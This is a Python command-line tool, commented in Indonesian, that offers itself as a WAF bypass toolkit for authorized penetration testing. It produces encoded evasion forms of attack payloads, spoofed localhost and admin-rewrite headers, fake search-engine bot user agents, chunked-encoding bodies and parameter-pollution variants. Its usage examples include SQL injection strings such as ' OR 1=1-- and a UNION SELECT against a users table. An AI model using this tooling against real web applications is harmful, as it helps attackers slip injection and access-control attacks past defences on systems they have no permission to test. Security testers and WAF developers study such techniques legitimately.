#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""waf_bypass.py — WAF bypass toolkit buat authorized pentest.

Fitur:
  - encode: encoding evasion (URL, hex, unicode, double URL)
  - headers: header injection buat bypass (X-Forwarded-For, X-Real-IP dll)
  - chunked: chunked transfer encoding bypass
  - json: JSON body bypass (Content-Type manipulation)
  - fuzz: fuzzing parameter pollution

    python3 waf_bypass.py encode --payload "' OR 1=1--" --method double-url
    python3 waf_bypass.py headers --target "http://target/search?q=test"
    python3 waf_bypass.py chunked --payload "GET /admin HTTP/1.1\r\nHost: target\r\n"
    python3 waf_bypass.py json --payload '{"id":"1 UNION SELECT * FROM users--"}'
    python3 waf_bypass.py fuzz --param id --values "1,1',1`,\")1,1}"
"""
import argparse, base64, json, random, string, sys, urllib.parse

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

def encode_payload(payload, method="url"):
    encoders = {
        "url": urllib.parse.quote,
        "double-url": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
        "hex": lambda p: "".join(f"%{ord(c):02x}" for c in p),
        "unicode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        "base64": lambda p: base64.b64encode(p.encode()).decode(),
        "mixed": lambda p: "".join(f"%{ord(c):02x}" if random.random() > 0.5 else c for c in p),
        "space2comment": lambda p: p.replace(" ", "/**/"),
        "space2plus": lambda p: p.replace(" ", "+"),
        "space2tab": lambda p: p.replace(" ", "\t"),
        "newline": lambda p: p.replace(" ", "\n"),
        "double-encode": lambda p: urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(p))),
        "html-entities": lambda p: "".join(f"&#{ord(c)};" for c in p),
        "overlong-utf8": lambda p: "".join(f"%{(ord(c) | 0x100):04x}" for c in p),
    }
    fn = encoders.get(method)
    if not fn:
        print(f"[-] Method tidak dikenal: {method}")
        print(f"    Available: {', '.join(encoders.keys())}")
        return None
    return fn(payload)

def headers_bypass(target):
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "127.0.0.1",
        "X-Forwarded-Host": "localhost",
        "X-Forwarded-Server": "localhost",
        "X-HTTP-Host-Override": "localhost",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-ProxyUser-Ip": "127.0.0.1",
        "X-Original-Forwarded-For": "127.0.0.1",
    }
    print(f"[*] Header bypass untuk: {target}")
    print(f"[*] Original UA: {UA_LIST[0]}")
    print()
    for h, v in headers.items():
        print(f"  {h}: {v}")
    print()
    print("[*] Bot UA (buat bypass WAF bot detection):")
    for ua in UA_LIST[2:]:
        print(f"  User-Agent: {ua}")
    print()
    print("[*] Debug headers:")
    debug_headers = {
        "X-Debug": "1",
        "X-Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "X-Requested-With": "XMLHttpRequest",
        "DNT": "1",
        "X-Content-Type-Options": "nosniff",
    }
    for h, v in debug_headers.items():
        print(f"  {h}: {v}")

def chunked_bypass(payload):
    print(f"[*] Chunked transfer encoding bypass")
    print(f"[*] Original: {payload[:60]}")
    print()
    lines = payload.split("\n") if "\n" in payload else [payload]
    result = []
    for line in lines:
        if not line:
            continue
        chunk_size = len(line.encode())
        result.append(f"{chunk_size:x}\r\n{line}\r\n")
    result.append("0\r\n\r\n")
    chunked = "".join(result)
    print("[*] Chunked encoding:")
    print(chunked)
    print()
    print("[*] Transfer-Encoding: chunked")
    return chunked

def json_bypass(payload):
    print(f"[*] JSON body bypass")
    print(f"[*] Content-Type variations:")
    ct_variants = [
        "application/json",
        "application/x-www-form-urlencoded",
        "text/plain",
        "application/xml",
        "multipart/form-data",
    ]
    for ct in ct_variants:
        print(f"  {ct}")
    print()
    print(f"[*] Payload JSON: {json.dumps(payload) if isinstance(payload, dict) else payload}")
    print(f"[*] Payload form-urlencoded: {urllib.parse.quote(str(payload))}")

def fuzz_params(param, values):
    print(f"[*] Fuzzing param: {param}")
    for v in values.split(","):
        print(f"  {param}={urllib.parse.quote(v)}")
    print()
    print("[*] HTTP Parameter Pollution:")
    print(f"  ?{param}=1&{param}=2")
    print(f"  ?{param}[]=1&{param}[]=2")
    print(f"  ?{param}=1%26{param}=2")

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return
    cmd = args[0]
    if cmd == "encode":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        p.add_argument("--method", default="url")
        a = p.parse_args(args[1:])
        result = encode_payload(a.payload, a.method)
        if result:
            print(f"[{a.method}] {result}")
    elif cmd == "headers":
        p = argparse.ArgumentParser()
        p.add_argument("--target", required=True)
        a = p.parse_args(args[1:])
        headers_bypass(a.target)
    elif cmd == "chunked":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        a = p.parse_args(args[1:])
        chunked_bypass(a.payload)
    elif cmd == "json":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        a = p.parse_args(args[1:])
        json_bypass(a.payload)
    elif cmd == "fuzz":
        p = argparse.ArgumentParser()
        p.add_argument("--param", required=True)
        p.add_argument("--values", required=True)
        a = p.parse_args(args[1:])
        fuzz_params(a.param, a.values)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
